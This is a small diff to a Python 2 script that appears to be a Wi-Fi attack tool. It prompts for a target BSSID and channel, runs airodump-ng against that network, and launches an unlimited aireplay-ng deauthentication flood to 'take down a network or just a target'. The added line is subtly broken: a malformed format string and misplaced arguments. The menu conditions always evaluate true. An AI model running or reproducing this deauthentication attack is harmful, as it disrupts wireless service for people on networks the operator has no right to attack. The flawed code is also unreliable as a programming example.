@@ -21,6 +21,8 @@ if main_choice == 'c':
   lack = raw_input("Would you like to take down a network or just a target n/T:")
   if lack == 'n' or 'N':
     t = raw_input("Enter the bssid of your target!:")
+    a = raw_input("Enter the channel of of your target:")
+    os.system("airodump-ng --channel %S --bssid %s wlan0mon" % a, t)
     os.system("aireplay-ng -0 0 -a %s wlan0mon" % t)
   if lack == 'y' or 'Y':
     p = raw_input("Enter the bssid of your target!:")
